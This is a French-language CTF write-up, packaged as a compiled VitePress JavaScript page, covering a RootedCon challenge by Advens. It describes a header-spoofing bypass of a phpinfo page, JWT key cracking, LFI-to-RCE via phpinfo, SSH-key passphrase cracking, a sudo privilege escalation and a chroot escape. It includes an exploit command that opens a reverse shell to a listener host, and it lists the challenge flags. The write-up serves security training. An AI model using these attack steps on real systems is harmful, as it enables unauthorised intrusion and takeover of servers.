import{_ as i,c as t,o as s,af as a}from"./chunks/framework.CgkrJXe5.js";const n="/medias/writeups/rootedcon-by-advens/image-1024x867.png",r="/medias/writeups/rootedcon-by-advens/image-1-1024x769.png",o="/medias/writeups/rootedcon-by-advens/image-2.png",p="/medias/writeups/rootedcon-by-advens/image-3-1024x119.png",c="/medias/writeups/rootedcon-by-advens/image-4-1024x573.png",l="/medias/writeups/rootedcon-by-advens/image-5-1024x579.png",d="/medias/writeups/rootedcon-by-advens/image-6-1024x332.png",u="/medias/writeups/rootedcon-by-advens/image-7-1024x300.png",m="/medias/writeups/rootedcon-by-advens/image-8-1024x563.png",h="/medias/writeups/rootedcon-by-advens/image-9.png",g="/medias/writeups/rootedcon-by-advens/image-10.png",b="/medias/writeups/rootedcon-by-advens/image-11.png",f="/medias/writeups/rootedcon-by-advens/image-12.png",v="/medias/writeups/rootedcon-by-advens/image-13.png",_="/medias/writeups/rootedcon-by-advens/image-14.png",k="/medias/writeups/rootedcon-by-advens/image-27.png",y="/medias/writeups/rootedcon-by-advens/image-28.png",q="/medias/writeups/rootedcon-by-advens/image-32.png",w="/medias/writeups/rootedcon-by-advens/image-29.png",C="/medias/writeups/rootedcon-by-advens/image-30.png",x="/medias/writeups/rootedcon-by-advens/image-31.png",F="/medias/writeups/rootedcon-by-advens/image-15.png",P="/medias/writeups/rootedcon-by-advens/image-16.png",j="/medias/writeups/rootedcon-by-advens/image-17.png",A="/medias/writeups/rootedcon-by-advens/image-18.png",R="/medias/writeups/rootedcon-by-advens/image-20.png",B="/medias/writeups/rootedcon-by-advens/image-19.png",L="/medias/writeups/rootedcon-by-advens/image-21.png",E="/medias/writeups/rootedcon-by-advens/image-22.png",J="/medias/writeups/rootedcon-by-advens/image-23.png",I="/medias/writeups/rootedcon-by-advens/image-24.png",T="/medias/writeups/rootedcon-by-advens/image-33.png",S="/medias/writeups/rootedcon-by-advens/image-25.png",G="/medias/writeups/rootedcon-by-advens/image-26.png",$=JSON.parse('{"title":"Writeup - RootedCon CTF By Advens","description":"","frontmatter":{"title":"Writeup - RootedCon CTF By Advens","date":"2024-03-06","categories":["writeups"],"tags":["writeup"],"image":"/medias/writeups/rootedcon-by-advens/2024-03-06_15-45.jpg"},"headers":[],"relativePath":"writeups/rootedcon-by-advens.md","filePath":"writeups/rootedcon-by-advens.md"}'),U={name:"writeups/rootedcon-by-advens.md"};function D(N,e,M,W,O,V){return s(),t("div",null,e[0]||(e[0]=[a('<p>Cette année, Advens propose un challenge pour la RootedCon. Mes collègues me l&#39;ont envoyé en avance afin de le tester.</p><p>Au moment où j&#39;ai reçu le challenge l’énoncé était clair : voici l&#39;ip. Je commence donc par une première phase d&#39;analyse de l&#39;application pour voir ce qui est proposé.</p><h2 id="reconnaissance" tabindex="-1">Reconnaissance : <a class="header-anchor" href="#reconnaissance" aria-label="Permalink to &quot;Reconnaissance :&quot;">​</a></h2><p>L&#39;application propose un formulaire d&#39;enregistrement / connexion. Un captcha est présent, celui-ci est suffisamment robuste pour ne pas faire partie du challenge. Je crée donc un compte utilisateur pour accéder à l&#39;application.</p><p><img src="'+n+'" alt="Interface d&#39;authentification"></p><p>J&#39;arrive ensuite sur une interface utilisateur qui permet de visualiser des pochettes de comics et de voter pour notre préféré.</p><p><img src="'+r+'" alt="Interface principale"></p><p>Un message de l&#39;administrateur indique qu&#39;aucun bruteforce n&#39;est nécessaire.</p><p><img src="'+o+'" alt="Message de l&#39;administrateur"></p><p>En regardant bien le code source de l&#39;application, je repère la présence d&#39;un lien commenté.</p><p><img src="'+p+'" alt="Lien commenté"></p><p>Celui-ci permet d&#39;accéder à l&#39;interface &quot;admin&quot;. Cependant, celle-ci nécessite une authentification.</p><p><img src="'+c+'" alt=""></p><p>Enfin, une page &quot;phpinfo.php&quot; semble accessible, mais restreinte à une IP spécifique.</p><p><img src="'+l+'" alt="Interface PHPInfo.php"></p><p>L&#39;accès à cette interface peut se faire en ajoutant un header &quot;X-Forwarded-For&quot;.</p><p><img src="'+d+'" alt=""></p><p>J&#39;obtiens donc un accès à l&#39;interface phpinfo.php.</p><p><img src="'+u+'" alt="Accès PHPInfo.php"></p><h2 id="acces-admin" tabindex="-1">Accès admin <a class="header-anchor" href="#acces-admin" aria-label="Permalink to &quot;Accès admin&quot;">​</a></h2><p>Une fois authentifié en simple utilisateur, je reçois un cookie de session contenant un JWT. Après analyse dans jwt.io, je constate que le JWT est chiffré de manière symétrique à l&#39;aide d&#39;un mot de passe.</p><p><img src="'+m+'" alt="JWT"></p><p>Celui-ci contient une date d&#39;expiration et un nom d&#39;utilisateur.</p><h3 id="recherche-de-la-clef" tabindex="-1">Recherche de la clef <a class="header-anchor" href="#recherche-de-la-clef" aria-label="Permalink to &quot;Recherche de la clef&quot;">​</a></h3><p>Pour obtenir la clef j&#39;utilise l&#39;outil <a href="https://github.com/lmammino/jwt-cracker" target="_blank" rel="noreferrer">JWT-Cracker</a>.</p><p><img src="'+h+'" alt="Obtention du mot de passe"></p><p>Je peux alors forger un nouveau JWT en modifiant le nom d&#39;utilisateur par &quot;admin&quot; et ainsi obtenir un accès sur l&#39;interface.</p><h3 id="reverse-shell" tabindex="-1">Reverse Shell <a class="header-anchor" href="#reverse-shell" aria-label="Permalink to &quot;Reverse Shell&quot;">​</a></h3><p>L&#39;interface d’administration propose de modifier les informations sur les éléments affichés sur l&#39;interface principale et de consulter un fichier de logs.</p><p>Pour cela, une requête POST est envoyé contenant un paramètre &quot;file&quot;.</p><p><img src="'+g+'" alt="Requête"></p><p>Remplacer &quot;logs.txt&quot; par une valeur vide permet de mettre en évidence une vulnérabilité LFI.</p><p><img src="'+b+`" alt="Mise en évidence de la LFI"></p><p>Cependant, un filtre est présent sur le paramètre file et remplace l&#39;ensemble des &quot;/&quot; par une chaine vide. Après avoir tenté de nombreux encodage j&#39;abandonne cette technique.</p><p>À ce moment-là un état des lieux s&#39;impose :</p><ul><li>LFI permettant de lire un fichier dans /tmp</li><li>Accès PHPInfo</li></ul><p>À partir de ces accès, un scénario de compromission existe : <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo" target="_blank" rel="noreferrer">LFI2RCE via PHPInfo</a></p><p>En résumé, la page phpinfo peut être utilisée pour envoyer un fichier qui sera stocké de manière temporaire dans /tmp juste le temps que le serveur se rende compte qu&#39;il n&#39;a pas besoin du fichier et le supprime.<br> Ainsi si en parallèle, il est possible de contacter ce fichier via une autre vulnérabilité celui-ci peut être exécuté.</p><p>Et c&#39;est pile le cas dans lequel nous sommes !</p><p>Il existe plusieurs codes d&#39;exploitation pour cette vulnérabilité, cependant aucun d&#39;entre eux ne prend en compte le scénario proposé, il faudra alors modifier l&#39;exploit pour le rendre compatible avec le challenge.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>https://github.com/takabaya-shi/LFI2RCE ;</span></span>
<span class="line"><span>https://github.com/roughiz/lfito_rce</span></span></code></pre></div><p><img src="`+f+'" alt="Modification de l&#39;exploit"></p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">python</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> lfito_rce.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --payload</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -l</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;http://164.90.211.116:8000/marvel-admin.php&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --lhost</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> remoteserver</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --lport</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1234</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;http://164.90.211.116:8000/phpinfo.php&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1</span></span></code></pre></div><p><img src="'+v+'" alt="Exploit"></p><p>Pour le débug, j&#39;utilise un proxy Burp pour l&#39;ensemble des requêtes afin de voir l&#39;exécution pas à pas.</p><p><img src="'+_+'" alt="Mise en évidence du succès de l&#39;exploitation."></p><p>Une fois l&#39;exploit passé, j&#39;obtiens un shell.</p><p><img src="'+k+'" alt="Shell obtenu"></p><p>Je dispose des droits de l&#39;utilisateur &quot;www-data&quot;</p><p><img src="'+y+'" alt="Privilèges"></p><p>Le flag de cette partie peut être obtenu dans le fichier functions.php</p><p><img src="'+q+'" alt="Obtention du second flag"></p><h2 id="privesc" tabindex="-1">Privesc <a class="header-anchor" href="#privesc" aria-label="Permalink to &quot;Privesc&quot;">​</a></h2><p>À partir du shell obtenu, je peux me balader sur le système. Je découvre alors un fichier clef ssh.</p><p><img src="'+w+'" alt="Découverte du fichier clef ssh"></p><p><img src="'+C+'" alt="Clef ssh"></p><p>Ainsi qu&#39;un message dans /tmp/notes.txt</p><p><img src="'+x+'" alt="Message"></p><p>Je comprends alors que la clef ssh appartient à l&#39;utilisateur &quot;drstrange&quot; et qu&#39;il s&#39;agit de la prochaine étape du challenge.</p><p>Cette clef est protégée par une passphrase, pour l&#39;obtenir, il existe un script &quot;ssh2john.py&quot; qui permet de convertir la clef vers un format &quot;exploitable&quot; par John the ripper.</p><p><img src="'+F+'" alt="Utilisation de johntheripper"></p><p>Dans les versions présentes dans les dépôts des différentes distributions, john est incapable d&#39;attaquer la clef proposée. Il faut utiliser la version présente sur le <a href="https://github.com/openwall/john" target="_blank" rel="noreferrer">github du projet</a> (je vous passe l&#39;étape du ./configure &amp;&amp; make )</p><p>Une fois recompilé, j&#39;envoie rockyou.txt et j&#39;attends mon mot de passe.</p><p><img src="'+P+'" alt="Obtention du mot de passe"></p><p>J&#39;obtiens alors un accès sur une interface SSH, mais celle-ci n&#39;est pas interactive.</p><p><img src="'+j+'" alt="Accès shell"></p><p>Le message affiché laisse entendre qu&#39;il va falloir faire du port knocking sur différents ports :</p><p><img src="'+A+'" alt="Découverte du message caché"></p><p><img src="'+R+'" alt="Message"></p><p>Pour cela, le binaire &quot;knockd&quot; peut être utilisé :</p><p><img src="'+B+'" alt="Utilisation de knockd"></p><p>Puis il suffit de se connecter sur le port 2222 : J&#39;obtiens un accès utilisateur, une rapide recherche des droits permettent de repérer l&#39;utilisation d&#39;un <a href="https://gtfobins.github.io/" target="_blank" rel="noreferrer">GTFOBin</a> :</p><p><img src="'+L+'" alt="Découverte d&#39;une élévation de privilège"></p><p><img src="'+E+'" alt="Exploitation de la vulnérabilité"></p><p>J&#39;obtiens ainsi un accès root sur le serveur.</p><h2 id="got-root" tabindex="-1">Got root ? <a class="header-anchor" href="#got-root" aria-label="Permalink to &quot;Got root ?&quot;">​</a></h2><p>Le flag récupérable à la racine indique que je n&#39;ai pas encore les droits maximums sur la machine.</p><p><img src="'+J+'" alt="Le flag indique qu&#39;il reste une étape"></p><p>Un utilisateur root qui n&#39;est pas root sur sa machine ? peut être un chroot ! Le fichier .bashrc trahis en effet l&#39;utilisation de ce procédé.</p><p><img src="'+I+'" alt="Mise en évidence du chroot"></p><p>Pour sortir de cet environnement cloisonné, j&#39;utilise <a href="https://github.com/earthquake/chw00t" target="_blank" rel="noreferrer">chw00t</a>. La machine distante ne disposant pas de binaires permettant de télécharger du contenu, et la connexion SCP étant peu stable à cause du port knocking j&#39;ai décidé de compiler le binaire sur ma machine, de l&#39;encoder en base64, copier / coller et de le décoder sur la machine cilbe.</p><p><img src="'+T+'" alt="Such h4ck3r sk1ll"></p><p><img src="'+S+'" alt="Exploitation de la vulnérabilité"></p><p><img src="'+G+'" alt="Véritable Flag"></p><h2 id="conclusion" tabindex="-1">Conclusion <a class="header-anchor" href="#conclusion" aria-label="Permalink to &quot;Conclusion&quot;">​</a></h2><p>Ce challenge m&#39;a permis de jouer avec la vulnérabilité lfi2rce via phpinfo et de découvrir l&#39;outil chw00t. Ayant fait ce challenge en dehors de la compétition, je ne peux pas parler de celle-ci.</p><p>Un grand merci à mes collègues espagnols de m&#39;avoir envoyé ce challenge.</p><p>Flags :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>ADVENS{w17h_GR347_p0w3R_C0m35_GR347_r35P0N5181l17y}ADVENS{7h3_0N3_4nd_0NLY}FLAG{DRSr4nG3_RUl3s}FAKE_FLAG{Not_The_fl4G_Y0uR_Lo0k1nG_FoR}FLAG{yoUr3R00T}</span></span></code></pre></div>',89)]))}const z=i(U,[["render",D]]);export{$ as __pageData,z as default};
